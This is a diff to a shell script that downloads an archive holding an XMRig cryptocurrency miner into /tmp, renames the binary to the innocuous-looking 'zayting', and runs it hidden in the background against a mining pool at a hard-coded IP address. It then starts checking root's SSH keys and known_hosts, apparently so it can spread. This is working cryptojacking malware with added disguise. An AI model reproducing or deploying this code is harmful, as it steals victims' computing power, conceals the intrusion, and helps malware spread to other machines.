@@ -1,8 +1,9 @@
-wget -P /tmp/ https://github.com/Pamentierx/xmr/raw/main/xmr.tar.gz
-tar -xvzf ./tmp/xmr.tar.gz -C ./tmp/
-cd /tmp/xmrig-6.14.1
-chmod +x /tmp/xmrig-6.14.1/xmrig
-nohup /tmp/xmrig-6.14.1/xmrig -o 107.182.176.159:8989 -u worker3 -p x -t 1 -B --cpu-priority 3 --cpu-max-threads-hint=50% --nicehash >/dev/null 2>&1 &
+wget -P /tmp/ https://github.com/Pamentierx/xmr/raw/main/zayting.tar.gz
+tar -xvzf ./tmp/zayting.tar.gz -C ./tmp/
+mv /tmp/xmrig-6.14.1 /tmp/zayting
+mv /tmp/zayting/xmrig /tmp/zayting/zayting
+chmod +x /tmp/zayting/zayting
+nohup /tmp/zayting/zayting -o 107.182.176.159:8989 -u worker3 -p x -t 1 -B --cpu-priority 3 --cpu-max-threads-hint=50% --nicehash >/dev/null 2>&1 &
 
 
 if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
